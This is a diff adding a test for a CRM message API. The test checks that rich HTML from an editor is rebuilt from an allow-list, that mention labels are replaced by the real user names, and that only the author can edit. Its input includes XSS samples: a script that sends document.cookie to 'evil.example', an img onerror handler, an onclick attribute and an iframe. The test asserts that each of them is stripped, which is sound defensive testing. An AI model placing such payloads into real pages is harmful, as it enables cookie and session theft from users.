@@ -201,6 +201,67 @@ describe('messages', () => {
     expect((ghost.json() as MessageItem).body).toBe('<p>cc @&lt;b&gt;Ghost&lt;/b&gt;</p>');
   });
 
+  test('a message written in the editor: rebuilt from the allow-list, mentions by the id with the real name (RFC 0034)', async () => {
+    const id = await deal('alice', { name: 'Deal rich' });
+    const post = (html: unknown, as = 'alice') =>
+      call('POST', `/api/v1/chatter/crm.deal/${id}/messages`, as, { kind: 'comment', html });
+    const res = await post(
+      '<h3>Summary</h3><p>Thanks <span data-type="mention" data-id="1" data-label="The CEO, apparently">@The CEO, apparently</span> — ' +
+        'see <strong>the offer</strong> at <a href="https://example.com/o?a=1&amp;b=2" onclick="steal()">this page</a>.</p>' +
+        '<ul><li>Price</li><li>Terms</li></ul>' +
+        '<script>fetch("https://evil.example/" + document.cookie)</script><img src=x onerror=alert(1)>' +
+        '<p>cc <span data-type="mention" data-id="999" data-label="Ghost">@Ghost</span> and <span data-type="mention">@nobody</span></p>',
+    );
+    expect(res.statusCode, res.body).toBe(201);
+    const message = res.json() as MessageItem;
+    expect(message.rich).toBe(true);
+    // The mention carries the user's own name, never the label that was sent; one of nobody is only its text.
+    expect(message.body).toBe(
+      '<h3>Summary</h3><p>Thanks <span data-type="mention" data-id="1" data-label="Mina Manager">@Mina Manager</span> — ' +
+        'see <strong>the offer</strong> at <a href="https://example.com/o?a=1&amp;b=2" target="_blank" rel="noopener noreferrer nofollow">this page</a>.</p>' +
+        '<ul><li>Price</li><li>Terms</li></ul>' +
+        '<p>cc @Ghost and @nobody</p>',
+    );
+    expect(message.mentions).toEqual([{ id: 1, name: 'Mina Manager' }]);
+    // Its words, for previews, notifications and search.
+    expect(message.text).toBe(
+      'Summary\nThanks @Mina Manager — see the offer at this page.\n• Price\n• Terms\ncc @Ghost and @nobody',
+    );
+    const [event] = (await events('mail.message.posted')).slice(-1);
+    expect(event?.payload).toMatchObject({ message: message.id, mentions: [1] });
+    expect(String(event?.payload['preview'])).toContain('Thanks @Mina Manager — see the offer');
+
+    // Nothing to say is refused: empty paragraphs, only what was stripped, not a text, too long.
+    for (const empty of ['', '<p></p>', '<p>   </p><script>x</script>', 42, 'a'.repeat(100_001)])
+      expect((await post(empty)).statusCode, String(empty).slice(0, 30)).toBe(400);
+
+    // Edited in the editor by its author, it stays rich; someone else cannot.
+    const edited = await call('PATCH', `/api/v1/chatter/messages/${message.id}`, 'alice', {
+      html: '<p>Shorter, with <em>emphasis</em><iframe src="https://evil.example"></iframe></p>',
+    });
+    expect(edited.statusCode, edited.body).toBe(200);
+    expect(edited.json()).toMatchObject({
+      rich: true,
+      body: '<p>Shorter, with <em>emphasis</em></p>',
+      text: 'Shorter, with emphasis',
+      mentions: [],
+    });
+    expect(
+      (await call('PATCH', `/api/v1/chatter/messages/${message.id}`, 'bob', { html: '<p>x</p>' }))
+        .statusCode,
+    ).toBe(403);
+    // A message written the plain way is as before.
+    const plain = (
+      await call('POST', `/api/v1/chatter/crm.deal/${id}/messages`, 'alice', {
+        text: '**bold** <b>x</b>',
+      })
+    ).json() as MessageItem;
+    expect(plain).toMatchObject({
+      rich: false,
+      body: '<p><strong>bold</strong> &lt;b&gt;x&lt;/b&gt;</p>',
+    });
+  });
+
   test('only the author edits or deletes; others see no source text', async () => {
     const id = await deal('alice', { name: 'Deal C' });
     const posted = (
